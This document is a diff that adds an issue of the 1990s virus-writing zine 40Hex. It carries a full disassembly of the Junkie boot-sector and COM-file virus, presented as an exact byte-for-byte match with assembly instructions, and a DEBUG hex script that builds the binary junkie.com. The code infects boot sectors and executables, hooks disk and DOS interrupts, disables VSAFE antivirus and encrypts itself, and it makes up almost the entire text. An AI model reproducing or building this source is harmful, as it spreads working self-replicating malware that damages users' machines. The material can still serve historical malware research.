@@ -1,0 +1,534 @@
+40Hex Number 14 Volume 5 Issue 1                                      File 006
+
+        Junkie virus
+
+        The Junkie virus is an unremarkable boot sector/COM infector that
+        has been making the rounds recently. There isn't really that much
+        to say about it, except that it sports a lot of poor coding that
+        manages to somehow work despite its shortcomings.
+
+        Dark Angel
+        Phalcon/Skism
+
+---------------------------
+                .model  tiny
+                .code
+                .radix  16
+                org     0
+; Junkie virus
+; Disassembly by Dark Angel of Phalcon/Skism for 40Hex #14 Vol 5 Iss 1
+; Byte for byte match when assembled with TASM 2.5
+; To assemble, do the following:
+;       tasm /m junkie.asm
+;       tlink junkie.obj
+;       exe2bin junkie.exe junkie.com
+junkie:         mov     si,1234                 ; if loading from the boot
+                org     $ - 2                   ; sector, loaded at 0:7E00
+decrypt_start   dw      offset begin_crypt + 100
+                mov     cx,1F4
+decrypt_loop:   xor     word ptr es:[si],1234
+                org     $-2
+cryptval        dw      0
+                inc     si
+                inc     si
+                loop    decrypt_loop
+
+begin_crypt:    mov     ax,cs
+                cmp     ax,0
+                je      in_boot
+                mov     di,100
+                mov     word ptr [di],1234      ; restore original first 4
+                org     $ - 2                   ; bytes to the COM file
+orig4_1         dw      20CDh
+                mov     word ptr [di+2],1234
+                org     $ - 2
+orig4_2         dw      0
+                push    cs di                   ; push cs:100
+                call    delta
+delta:          pop     bx
+                sub     bx,delta - junkie       ; sub bx,27
+                mov     cl,4
+                shr     bx,cl
+                add     ax,bx
+                push    ax
+                mov     ax,offset highentry
+                push    ax
+                retf
+
+in_boot:        mov     ds,di
+                pop     si
+                sub     word ptr ds:413,3       ; reserve 3K for virus
+                mov     ax,ds:413
+                mov     bx,40                   ; convert to K
+                mul     bx
+                mov     es,ax                   ; virus segment = es
+                mov     cx,200                  ; move virus up
+                cld
+                rep     movsw
+
+                cli
+                mov     di,offset old_i13
+                mov     si,13*4
+                mov     ax,offset i13
+                call    swap_int
+
+                mov     es:check_i21_flag,0
+
+                mov     di,offset old_i1c
+                mov     si,1c*4
+                mov     ax,offset i1c
+                call    swap_int                ; timer ticks
+                sti
+
+                mov     di,offset old_i21       ; save original int 21
+                mov     si,21*4                 ; handler address
+                movsw
+                movsw
+                pop     di                      ; di = 7C00
+
+                push    cs di es
+                mov     ax,offset boot_finish
+                push    ax cs
+                pop     es
+                mov     si,7C00 + 200 + BS_first_word - junkie
+                movsw                           ; restore first word
+                db      83,0C7h,5E ; add di,5E  ; restore original BS code
+                call    copy_20
+                retf                            ; jmp to boot_finish
+
+                db      'DrW-3'
+
+i13:            cmp     ax,0201                 ; read?
+                jnz     jmp_i13
+                db      83,0F9h,1 ; cmp cx,1    ; boot sector?
+                jnz     jmp_i13
+                db      83,0FAh,0 ; cmp dx,0    ; ditto
+                jnz     jmp_i13
+                push    ax bx cx dx di si ds es ; pusha, in a way
+                call    infect_disk             ; if so, infect the disk
+                pop     es ds si di dx cx bx ax ; popa, of sorts
+jmp_i13:        jmp     dword ptr cs:old_i13
+
+old_i13         dw      0, 0
+
+call_i13:       pushf
+                call    dword ptr cs:old_i13
+                retn
+
+highentry:      call    uninstall_VSAFE
+                push    ds es
+                xor     ax,ax
+                mov     ds,ax
+                push    cs
+                pop     es
+                mov     di,offset old_i13       ; get original int 13
+                mov     si,13*4                 ; handler address
+                cld
+                movsw
+                movsw
+                jmp     short COM_finish
+                nop ; Why does this still happen?
+boot_finish:    push    ds es
+COM_finish:     mov     dl,80                   ; infect the hard drive
+                mov     ah,2
+                call    infect_disk
+                pop     es ds
+                xor     ax,ax
+                xor     bx,bx
+                retf                            ; return to carrier
+
+infect_disk:    push    cs
+                pop     ds
+                push    cs
+                pop     es
+                call    disk
+                jc      inf_disk_exit
+                mov     di,offset buffer + 60
+                cmp     word ptr [si],5EEBh     ; check if we're already
+                jne     not_in_boot_yet         ; in the boot sector
+                cmp     word ptr [di],0FF33     ; xor di,di
+                je      inf_disk_exit
+not_in_boot_yet:cmp     dl,0                    ; first disk drive?
+                jne     hard_disk               ; if not, assume hard drive
+                cmp     byte ptr ds:[buffer+15],0F0  ; else check media byte
+                je      little_floppy           ; to see if it is a 3.5" drive
+                cmp     byte ptr ds:[buffer+15],0F9h ; 5.25" drive?
+                jne     inf_disk_exit
+large_floppy:   mov     cl,8                    ; sector 8
+                jmp     short floppy_disk
+                nop ; more NOP's for your money
+little_floppy:  mov     ax,40
+                mov     ds,ax
+                cmp     byte ptr ds:90,97       ; check disk 0 status
+                je      large_floppy
+                mov     cl,11                   ; write to last sector
+floppy_disk:    push    cs
+                pop     ds
+                mov     ch,4F                   ; write to last track
+                jmp     short floppy_setup
+                nop ; blah
+
+hard_disk:      mov     cx,4                    ; write to slack area on hd
+                jmp     short write_to_disk
+                nop ; #$@*
+
+floppy_setup:   mov     dh,1                    ; head 1
+write_to_disk:  mov     load_cx,cx              ; remember where the rest of
+                mov     load_dx,dx              ; junkie will be written to
+                push    dx cx si di
+                mov     di,offset BS_first_word ; save old boot sector JMP
+                movsw                           ; construct
+                pop     si                      ; si -> buffer+60
+                call    copy_20                 ; save old boot sector code
+                mov     si,di                   ; si -> JBS_first_word
+                pop     di                      ; di -> buffer
+                movsw                           ; encode our JMP to boot sector
+                call    add_copy_20             ; write our code there
+
+                mov     ax,301h                 ; write new BS to the disk
+                push    ax
+                call    disk
+
+                pop     ax cx dx
+                mov     al,2                    ; junkie is two sectors long
+                mov     bx,offset buffer        ; write it encrypted to disk
+                jc      inf_disk_exit
+                mov     decrypt_start,7E00 + (begin_crypt - junkie)
+                call    encrypt
+                call    call_i13
+inf_disk_exit:  retn
+
+disk:           mov     cx,1
+                mov     dh,0
+                mov     al,1
+                mov     bx,offset buffer        ; read/write to/from our buffer
+                mov     si,bx
+                push    dx
+                call    call_i13
+                pop     dx
+                retn
+
+add_copy_20:    db      83,0C7h,5E ; add di,5E  ; move from first word to
+                                                ; our code in boot sector
+copy_20:        cld
+                mov     cx,10
+                rep     movsw
+                retn
+
+swap_int:       push    si
+                movsw
+                movsw
+                pop     si
+                mov     [si],ax
+                mov     [si+2],es
+                retn
+
+encrypt:        push    es ds ax bx cx dx si di
+                cld
+                xor     ax,ax                   ; get timer count
+                int     1Ah
+
+                xor     dx,cx                   ; more time stuff
+                mov     bx,dx
+                mov     ah,2
+                int     1Ah
+
+                mov     dl,cl                   ; to calculate an encryption
+                xor     bx,dx                   ; value (this is overkill!)
+                mov     cryptval,bx
+
+                push    cs
+                pop     es
+                mov     si,offset junkie
+                mov     di,offset buffer
+                mov     cx,200
+                rep     movsw                   ; copy virus to the buffer
+
+                mov     di,offset buffer        ; and encrypt there
+                add     di,begin_crypt - junkie
+                mov     cx,(buffer - junkie) / 2; encrypting too much!
+encrypt_loop:   xor     [di],bx
+                inc     di
+                inc     di
+                loop    encrypt_loop
+
+popa_exit:      pop     di si dx cx bx ax ds es
+                retn
+
+uninstall_VSAFE:push    es ds ax bx cx dx si di
+                mov     dx,5945                 ; uninstall VSAFE/VWATCH
+                mov     ax,0FA01
+                int     16
+                jmp     short popa_exit
+
+i1c:            cmp     cs:check_i21_flag,1
+                je      jmp_i1c
+                push    ds es ax si di
+                mov     si,21*4
+                xor     ax,ax
+                mov     ds,ax
+                mov     ax,ds:20*4+2            ; get segment of int 20 handler
+                cmp     ax,800                  ; is it too high?
+                ja      i1c_exit
+                cmp     ax,0                    ; or not set yet?
+                je      i1c_exit
+                cmp     [si+2],ax               ; is segment of int 21 handler
+                jne     i1c_exit                ; the same?
+                cmp     ds:27*4+2,ax            ; same with int 27 handler
+                jne     i1c_exit                ; i.e. make sure it's dos!
+                cli
+                mov     di,offset old_i21
+                push    cs
+                pop     es
+                mov     ax,offset i21
+                call    swap_int
+                mov     cs:check_i21_flag,1
+                sti
+i1c_exit:       pop     di si ax es ds
+jmp_i1c:        jmp     dword ptr cs:old_i1c
+
+old_i1c         dw      0FF53, 0F000
+
+i21:            cmp     ax,4B00                 ; infect on: execute,
+                jz      infect_file
+                cmp     ah,3Dh                  ; open,
+                jz      infect_file
+                cmp     ah,6C                   ; extended open
+                jz      infect_file
+jmp_i21:        jmp     dword ptr cs:old_i21
+
+i24:            mov     al,3
+                iret
+
+infect_file:    push    ax bx cx dx di si ds es
+                cmp     ah,6Ch                  ; extended open?
+                jne     ptr_is_ds_dx
+                mov     dx,si                   ; now ds:ds -> filename
+ptr_is_ds_dx:   call    uninstall_VSAFE
+                mov     cx,ax
+                xor     ax,ax
+                push    ds
+                mov     ds,ax
+                les     ax,dword ptr ds:24*4    ; get old crit error handler
+                mov     word ptr ds:24*4,offset i24
+                mov     word ptr ds:24*4+2,cs   ; replace with ours
+                pop     ds
+                push    es ax                   ; save the old one for later
+
+                mov     ax,3D00                 ; open the file read/only
+                pushf
+                call    dword ptr cs:old_i21
+                jc      infect_file_exit
+
+                push    cs
+                pop     ds
+
+                mov     bx,ax
+                push    bx
+                mov     ax,1220
+                int     2F
+                mov     ax,1216
+                mov     bl,es:[di]
+                int     2F                      ; es:di -> sft
+                pop     bx
+                jc      close_exit
+
+                cmp     word ptr es:[di+28h],'OC'; infect only *.CO?
+                je      infect_COM
+                jmp     short close_exit
+                nop     ; Yuck!
+infect_COM:     push    es di
+                mov     word ptr es:[di+2],2    ; set open mode to read/write
+                call    infect
+                pop     di es
+                or      byte ptr es:[di+6],40   ; preserve file time/date
+
+close_exit:     mov     ah,3Eh                  ; close file
+                int     21
+
+infect_file_exit:
+                xor     si,si
+                mov     ds,si
+                pop     ax
+                pop     es
+                mov     ds:24*4,ax              ; restore int 24 handler
+                mov     word ptr ds:24*4+2,es
+                pop     es ds si di dx cx bx ax
+                jmp     jmp_i21
+
+infect:         call    move_SOF
+                mov     cx,1Dh                  ; reading in more than we need!
+                mov     ah,3F
+                mov     dx,offset com_header
+                int     21
+                jc      infect_exit
+
+                call    go_EOF
+                mov     cx,10
+                div     cx
+                db      83,0FAh,3 ; cmp dx,3
+                jz      infect_exit
+                mov     cx,[com_header]         ; move first four bytes to
+                mov     dx,[com_header+2]       ; the patch area
+                mov     orig4_1,cx
+                mov     orig4_2,dx
+                call    go_EOF
+                cmp     ax,1000                 ; too small?
+                jb      infect_exit
+                cmp     ax,0EA60                ; too large?
+                ja      infect_exit
+                call    round_paragraph
+                push    ax
+                add     ax,100 + offset begin_crypt - offset junkie
+                mov     decrypt_start,ax
+                pop     ax
+                mov     byte ptr com_header,0E9h
+                sub     ax,3
+                mov     word ptr com_header+1,ax
+
+                mov     ah,40                   ; writing more than we need!
+                mov     cx,end_junkie - junkie
+                mov     dx,offset buffer
+                call    encrypt
+                int     21
+                jc      infect_exit
+
+                mov     al,0                    ; go to the start of the file
+                call    move_SOF
+                mov     dx,offset com_header    ; patch beginning of COM file
+                mov     cx,4
+                mov     ah,40
+                int     21
+infect_exit:    retn
+
+round_paragraph:mov     ah,al
+                mov     al,10
+                sub     al,ah
+                and     ax,0F
+                mov     dx,ax
+                mov     al,1
+                jmp     short move_fpointer
+                nop ; MASM NOP!
+
+go_EOF:         mov     al,2
+move_SOF:       xor     dx,dx
+move_fpointer:  xor     cx,cx
+                mov     ah,42h
+                int     21
+                retn
+
+old_i21         dw      0, 0
+                dw      0               ; unused
+check_i21_flag  db      1
+
+                db      0, 'Dr White - Sweden 1994'
+
+BS_first_word   dw      0
+
+old_BS_code     db      20 dup (0)              ; storage for original boot
+                                                ; sector code from offset
+                                                ; 60 to 80
+JBS_first_word  dw      05EEBh
+
+start_Jboot:    xor     di,di
+                mov     si,7C00
+                cli
+                mov     sp,si                   ; set the stack to 7C00:7C00
+                mov     ss,di
+                sti
+                mov     es,di                   ; es = 7C00 (junkie work seg)
+                mov     ax,202h                 ; read junkie into memory
+                mov     bx,7C00 + 200           ; starting at 0:7E00
+                mov     cx,4
+                org     $ - 2
+load_cx         dw      4
+                mov     dx,80
+                org     $ - 2
+load_dx         dw      80
+                push    si bx                   ; push 0:7C00
+                int     13
+; the next line loads at offset 7C80 - 3
+                jmp     $+3+200-80              ; jmp to 7E00 (decryptor)
+end_Jboot:      ; ($ - start_Jboot = 20)
+
+                db      'Junkie Virus - Written in Malmo...M01D'
+
+                dw      -1                      ; unused
+
+com_header      dw      0, 0
+buffer:         db      1bh dup (0)
+end_junkie:
+                end     junkie
+---------------------------
+N junkie.com
+E 0100  BE 0F 01 B9 F4 01 26 81 34 00 00 46 46 E2 F7 8C
+E 0110  C8 3D 00 00 74 21 BF 00 01 C7 05 CD 20 C7 45 02
+E 0120  00 00 0E 57 E8 00 00 5B 83 EB 27 B1 04 D3 EB 03
+E 0130  C3 50 B8 C3 00 50 CB 8E DF 5E 83 2E 13 04 03 A1
+E 0140  13 04 BB 40 00 F7 E3 8E C0 B9 00 02 FC F3 A5 FA
+E 0150  BF B8 00 BE 4C 00 B8 91 00 E8 30 01 26 C6 06 60
+E 0160  03 00 BF 33 02 BE 70 00 B8 EA 01 E8 1E 01 FB BF
+E 0170  5A 03 BE 84 00 A5 A5 5F 0E 57 06 B8 DA 00 50 0E
+E 0180  07 BE 78 81 A5 83 C7 5E E8 FA 00 CB 44 72 57 2D
+E 0190  33 3D 01 02 75 1D 83 F9 01 75 18 83 FA 00 75 13
+E 01A0  50 53 51 52 57 56 1E 06 E8 3F 00 07 1F 5E 5F 5A
+E 01B0  59 5B 58 2E FF 2E B8 00 00 00 00 00 9C 2E FF 1E
+E 01C0  B8 00 C3 E8 12 01 1E 06 33 C0 8E D8 0E 07 BF B8
+E 01D0  00 BE 4C 00 FC A5 A5 EB 03 90 1E 06 B2 80 B4 02
+E 01E0  E8 07 00 07 1F 33 C0 33 DB CB 0E 1F 0E 07 E8 7F
+E 01F0  00 72 7C BF 48 04 81 3C EB 5E 75 06 81 3D 33 FF
+E 0200  74 6D 80 FA 00 75 28 80 3E FD 03 F0 74 0C 80 3E
+E 0210  FD 03 F9 75 5A B1 08 EB 0F 90 B8 40 00 8E D8 80
+E 0220  3E 90 00 97 74 EF B1 11 0E 1F B5 4F EB 07 90 B9
+E 0230  04 00 EB 03 90 B6 01 89 0E B0 03 89 16 B3 03 52
+E 0240  51 56 57 BF 78 03 A5 5E E8 3A 00 8B F7 5F A5 E8
+E 0250  30 00 B8 01 03 50 E8 17 00 58 59 5A B0 02 BB E8
+E 0260  03 72 0C C7 06 01 00 0F 7E E8 2A 00 E8 4D FF C3
+E 0270  B9 01 00 B6 00 B0 01 BB E8 03 8B F3 52 E8 3C FF
+E 0280  5A C3 83 C7 5E FC B9 10 00 F3 A5 C3 56 A5 A5 5E
+E 0290  89 04 8C 44 02 C3 06 1E 50 53 51 52 56 57 FC 33
+E 02A0  C0 CD 1A 33 D1 8B DA B4 02 CD 1A 8A D1 33 DA 89
+E 02B0  1E 09 00 0E 07 BE 00 00 BF E8 03 B9 00 02 F3 A5
+E 02C0  BF E8 03 83 C7 0F B9 F4 01 31 1D 47 47 E2 FA 5F
+E 02D0  5E 5A 59 5B 58 1F 07 C3 06 1E 50 53 51 52 56 57
+E 02E0  BA 45 59 B8 01 FA CD 16 EB E5 2E 80 3E 60 03 01
+E 02F0  74 3C 1E 06 50 56 57 BE 84 00 33 C0 8E D8 A1 82
+E 0300  00 3D 00 08 77 23 3D 00 00 74 1E 39 44 02 75 19
+E 0310  39 06 9E 00 75 13 FA BF 5A 03 0E 07 B8 37 02 E8
+E 0320  6A FF 2E C6 06 60 03 01 FB 5F 5E 58 07 1F 2E FF
+E 0330  2E 33 02 53 FF 00 F0 3D 00 4B 74 12 80 FC 3D 74
+E 0340  0D 80 FC 6C 74 08 2E FF 2E 5A 03 B0 03 CF 50 53
+E 0350  51 52 57 56 1E 06 80 FC 6C 75 02 8B D6 E8 78 FF
+E 0360  8B C8 33 C0 1E 8E D8 C4 06 90 00 C7 06 90 00 4B
+E 0370  02 8C 0E 92 00 1F 06 50 B8 00 3D 9C 2E FF 1E 5A
+E 0380  03 72 36 0E 1F 8B D8 53 B8 20 12 CD 2F B8 16 12
+E 0390  26 8A 1D CD 2F 5B 72 1D 26 81 7D 28 43 4F 74 03
+E 03A0  EB 13 90 06 57 26 C7 45 02 02 00 E8 23 00 5F 07
+E 03B0  26 80 4D 06 40 B4 3E CD 21 33 F6 8E DE 58 07 A3
+E 03C0  90 00 8C 06 92 00 07 1F 5E 5F 5A 59 5B 58 E9 75
+E 03D0  FF E8 7D 00 B9 1D 00 B4 3F BA E4 03 CD 21 72 5E
+E 03E0  E8 6C 00 B9 10 00 F7 F1 83 FA 03 74 51 8B 0E E4
+E 03F0  03 8B 16 E6 03 89 0E 1B 00 89 16 20 00 E8 4F 00
+E 0400  3D 00 10 72 39 3D 60 EA 77 34 E8 32 00 50 05 0F
+E 0410  01 A3 01 00 58 C6 06 E4 03 E9 2D 03 00 A3 E5 03
+E 0420  B4 40 B9 03 04 BA E8 03 E8 6B FE CD 21 72 0F B0
+E 0430  00 E8 1D 00 BA E4 03 B9 04 00 B4 40 CD 21 C3 8A
+E 0440  E0 B0 10 2A C4 25 0F 00 8B D0 B0 01 EB 05 90 B0
+E 0450  02 33 D2 33 C9 B4 42 CD 21 C3 00 00 00 00 00 00
+E 0460  01 00 44 72 20 57 68 69 74 65 20 2D 20 53 77 65
+E 0470  64 65 6E 20 31 39 39 34 00 00 00 00 00 00 00 00
+E 0480  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+E 0490  00 00 00 00 00 00 00 00 00 00 EB 5E 33 FF BE 00
+E 04A0  7C FA 8B E6 8E D7 FB 8E C7 B8 02 02 BB 00 7E B9
+E 04B0  04 00 BA 80 00 56 53 CD 13 E9 80 01 4A 75 6E 6B
+E 04C0  69 65 20 56 69 72 75 73 20 2D 20 57 72 69 74 74
+E 04D0  65 6E 20 69 6E 20 4D 61 6C 6D 6F 2E 2E 2E 4D 30
+E 04E0  31 44 FF FF 00 00 00 00 00 00 00 00 00 00 00 00
+E 04F0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+E 0500  00 00 00
+R CX
+0403
+W
+Q
+---------------------------
+
